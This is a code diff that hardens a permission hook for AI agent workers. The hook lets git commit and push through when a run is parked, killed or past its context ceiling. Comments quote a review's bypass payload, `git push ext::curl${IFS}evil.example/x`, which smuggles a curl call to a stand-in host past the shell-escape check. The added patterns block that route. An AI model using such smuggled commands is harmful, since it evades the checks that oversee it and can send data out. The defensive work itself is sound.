@@ -133,10 +133,31 @@ const WORK_PRESERVING_GIT: Record<string, ReadonlySet<string>> = {
 };
 
 /**
- * Any character that could start a second program. `&&` is removed before this runs, so
- * a lone `&` here is a background operator and refuses the line.
+ * Any character that could reach a second program, or become one after the shell has
+ * expanded the line. `&&` is removed before this runs, so a lone `&` here is a background
+ * operator and refuses the line.
+ *
+ * `$`, `{` and `}` are here because of a review's `git push ext::curl${IFS}evil.example/x`:
+ * every character in `${IFS}` passed an earlier version of this check, the tokenizer saw
+ * one argument, and the real shell then split it back into two at execution time. A
+ * substitution that changes the word count after this function has counted the words
+ * defeats any parse, so none is admitted. Globs go for the same reason.
+ *
+ * Quotes are NOT here: `git commit -m "wip"` is the shape a shut-down worker actually
+ * writes, and with `$` and backtick already refused a quote cannot expand to anything.
+ * They are stripped from each token before the flag check instead, because `git push
+ * "--force" origin` reaches git as `--force` however it was quoted.
  */
-const SHELL_ESCAPE = /[;|`&<>\n\r\t]|\$\(/;
+const SHELL_ESCAPE = /[;|`&<>$(){}\[\]*?!\\\n\r\t]/;
+
+/** Quote characters, removed before a token is compared to the flag allow-list. */
+const QUOTES = /['"]/g;
+
+/** `ext::`, `fd::` and every other transport git resolves by running a command. */
+const GIT_TRANSPORT = /::/;
+
+/** A remote name. Deliberately not a URL: a shutdown path pushes to a configured remote. */
+const REMOTE_NAME = /^[A-Za-z0-9._-]+$/;
 
 /**
  * The calls a run may make even once it is parked, past its context ceiling, or stopped
@@ -182,25 +203,42 @@ function isWorkPreservingGitCall(segment: string): boolean {
   // key git resolves by running something (`alias.*`, `core.fsmonitor`, every `*.pager`
   // and `*Command`), so there is no safe subset of it to admit here.
   let i = 1;
-  while (parts[i] === '-C') {
-    const path = parts[i + 1];
+  while (parts[i]?.replace(QUOTES, '') === '-C') {
+    const path = parts[i + 1]?.replace(QUOTES, '');
     if (path === undefined || path.startsWith('-')) return false;
     i += 2;
   }
-  const subcommand = parts[i];
+  const subcommand = parts[i]?.replace(QUOTES, '');
   if (subcommand === undefined) return false;
   const allowedFlags = WORK_PRESERVING_GIT[subcommand];
   if (!allowedFlags) return false;
-  // Every remaining argument that looks like a flag must be named for this subcommand.
-  // A value (a branch, a remote, a path, the text of a commit message) never starts with
-  // a dash, so an unrecognised dashed argument refuses the line rather than being
-  // guessed at -- that is what keeps `--force`, `--delete`, `--amend`, `--exec` and
-  // `--receive-pack` out without this list having to predict them.
-  return parts.slice(i + 1).every((arg) => {
+  const args = parts.slice(i + 1);
+  // Every argument that looks like a flag must be named for this subcommand. A value (a
+  // branch, a remote, a path, a word of a commit message) never starts with a dash, so an
+  // unrecognised dashed argument refuses the line rather than being guessed at -- that is
+  // what keeps `--force`, `--delete`, `--amend`, `--exec` and `--receive-pack` out
+  // without this list having to predict them.
+  const flagsOk = args.every((raw) => {
+    const arg = raw.replace(QUOTES, '');
     if (!arg.startsWith('-')) return true;
     const name = arg.includes('=') ? arg.slice(0, arg.indexOf('=')) : arg;
     return allowedFlags.has(name);
   });
+  if (!flagsOk) return false;
+  // `ext::<command>` and its siblings make git run a program to reach the remote, so a
+  // transport prefix refuses the line wherever it appears. A review reached this with
+  // `git push ext::curl${IFS}evil.example/x` while every flag was legitimate.
+  if (args.some((arg) => GIT_TRANSPORT.test(arg))) return false;
+  // A push names a configured remote, never a URL. The destination is the first argument
+  // that is not a flag and not a flag's value; `-u origin HEAD` and `origin HEAD:main`
+  // are both the shape a shut-down worker needs, and neither needs a URL to work.
+  if (subcommand === 'push') {
+    // None of push's allowed flags takes a separate value, so the first argument that is
+    // not a flag is the remote.
+    const remote = args.map((a) => a.replace(QUOTES, '')).find((arg) => !arg.startsWith('-'));
+    if (remote !== undefined && !REMOTE_NAME.test(remote)) return false;
+  }
+  return true;
 }
 
 export function buildWorkerOptions(
@@ -500,13 +538,15 @@ export function buildPreToolUseHook(deps: PreToolUseHookDeps) {
     // down still runs on the call, so a push at a protected branch is refused there the
     // same as ever -- this allowance opens the shutdown gates, not the guard rails.
     //
-    // `shielded` is set only where a gate WOULD have denied, so the journal carries one
+    // `shielded` collects every gate that WOULD have denied, so the journal carries one
     // row per call actually rescued and nothing at all in a healthy run. A row per
-    // ordinary `git status` is how a useful signal becomes 12,000 rows of noise.
+    // ordinary `git status` is how a useful signal becomes 12,000 rows of noise. More
+    // than one gate can be closed at once -- a kill switch engaged over a parked run --
+    // and the row names all of them rather than whichever matched last.
     const preserving = isWorkPreserving(call.toolName, call.input);
-    let shielded: string | undefined;
+    const shielded: string[] = [];
     const parkRecord = readParkRecord(deps.run);
-    if (parkRecord && preserving) shielded = `parked by warden: ${parkRecord.key}`;
+    if (parkRecord && preserving) shielded.push(`parked by warden: ${parkRecord.key}`);
     if (parkRecord && !preserving) {
       deps.journal.append({
         event: 'permission.denied', run: deps.run, actor: 'runner', tool: call.toolName,
@@ -518,14 +558,20 @@ export function buildPreToolUseHook(deps: PreToolUseHookDeps) {
       };
     }
     const key = deps.parked.get(deps.run);
-    if (key && preserving) shielded = `parked on ${key}`;
-    if (key && !preserving) {
+    // The answer check comes before the allowance, not after it: an answer that has
+    // landed resumes the run on the very next call, and a work-preserving call is still
+    // a call. Gating this on `!preserving` left an answered run parked one turn longer
+    // for no reason (code review, 2026-09-14).
+    if (key) {
       const entry = deps.inbox.entry(key);
       if (entry?.answer !== undefined) {
         deps.parked.delete(deps.run);
         deps.journal.append({ event: 'run.resumed', run: deps.run, actor: 'console', key });
         return { decision: undefined, additionalContext: deps.inbox.resumePrompt(key) };
       }
+    }
+    if (key && preserving) shielded.push(`parked on ${key}`);
+    if (key && !preserving) {
       deps.journal.append({
         event: 'permission.denied', run: deps.run, actor: 'runner', tool: call.toolName,
         reason: `parked on ${key}`,
@@ -556,7 +602,7 @@ export function buildPreToolUseHook(deps: PreToolUseHookDeps) {
           + 'no console here to receive its notifications. Poll with a plain Bash command instead.',
       };
     }
-    if (deps.killSwitchHit?.() && preserving) shielded = 'the fleet kill switch is engaged';
+    if (deps.killSwitchHit?.() && preserving) shielded.push('the fleet kill switch is engaged');
     if (deps.killSwitchHit?.() && !preserving) {
       deps.journal.append({
         event: 'permission.denied', run: deps.run, actor: 'runner', tool: call.toolName,
@@ -568,7 +614,7 @@ export function buildPreToolUseHook(deps: PreToolUseHookDeps) {
         additionalContext: STOP_HANDOFF_REQUEST,
       };
     }
-    if (deps.ceilingHit?.() && preserving) shielded = 'context ceiling reached';
+    if (deps.ceilingHit?.() && preserving) shielded.push('context ceiling reached');
     if (deps.ceilingHit?.() && !preserving) {
       deps.journal.append({
         event: 'permission.denied', run: deps.run, actor: 'runner', tool: call.toolName,
@@ -583,10 +629,10 @@ export function buildPreToolUseHook(deps: PreToolUseHookDeps) {
     // One row per call a closed gate let through, naming which gate it was. A run that
     // ends at its ceiling with a commit behind it is then visible as exactly that,
     // rather than as another "stopped on the way to a pull request".
-    if (shielded) {
+    if (shielded.length) {
       deps.journal.append({
         event: 'run.work-preserved', run: deps.run, actor: 'runner', tool: call.toolName,
-        reason: shielded,
+        reason: shielded.join('; '),
       });
     }
     // P4.7/I4 (scoped by P4.7/I10): the Council's rules library, on every Bash and
